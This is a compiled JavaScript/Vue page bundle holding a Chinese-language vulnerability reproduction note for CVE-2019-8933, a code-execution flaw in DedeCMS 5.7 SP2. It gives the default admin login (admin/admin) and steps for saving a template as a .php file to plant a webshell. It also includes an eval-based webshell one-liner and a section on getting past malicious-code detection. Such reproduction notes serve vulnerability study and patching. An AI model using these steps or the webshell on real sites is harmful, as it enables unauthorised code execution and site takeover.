import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as t}from"./app-58e4a7d6.js";const d={},n=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Desdev DedeCMS（织梦内容管理系统）是中国卓卓网络（Desdev）公司的一套基于 PHP 的开源内容管理系统（CMS）。该系统具有内容发布、内容管理、内容编辑和内容检索等功用。 DedeCMS 5.7 SP2 版本中存在漏洞。远程攻击者可经过在添加新模板时，将文件名 ../index.html 更改成 ../index.php 应用该漏洞向 uploads/ 目录上传 .php 文件并执行该文件。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DedeCMS 5.7 SP2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>默认后台登陆路径 <code>/dede/login.php</code> 或 <code>/uploads/dede/login.php</code> ，默认用户名密码 <code>admin/admin</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327100333720.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>模板 -&gt; 默认模板管理 -&gt; 新建模板，写入shell，保存：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327103008160.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>生成 -&gt; 更新主页 HTML -&gt; 浏览：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>选择主页模板：default/newtpl.htm
主页位置：更改.html后缀为.php
首页模式：生成静态
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327103144180.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>连接 webshell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://&lt;YOUR-IP&gt;/index.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327103310620.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="bypass" tabindex="-1"><a class="header-anchor" href="#bypass" aria-hidden="true">#</a> BYPASS</h3><p>如果被检测到存在恶意代码：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327104323450.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进行绕过，保存成功：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>// file_put_contents(&#39;./shell.php&#39;, &quot;&lt;?php eval($_GET[a]);&quot;);

___PHP0___</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>核心 -&gt; 频道类型 -&gt; 单页文档管理，通过新建模板 <code>newtpl.htm</code> 新建页面，更改 .html 后缀为 .php：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327104903691.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>现在，我们在 <code>/a/</code> 目录下创建了一个文件，访问 <code>/a/npc.php</code> 页面，将会执行 <code>file_put_contents</code> 函数生成一个 <code>shell.php</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://&lt;YOUR-IP&gt;/a/shell.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327105235514.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,25),l=[n];function p(s,c){return a(),i("div",null,l)}const g=e(d,[["render",p],["__file","DedeCMS 5.7SP2 代码执行漏洞 CVE-2019-8933.html.vue"]]);export{g as default};
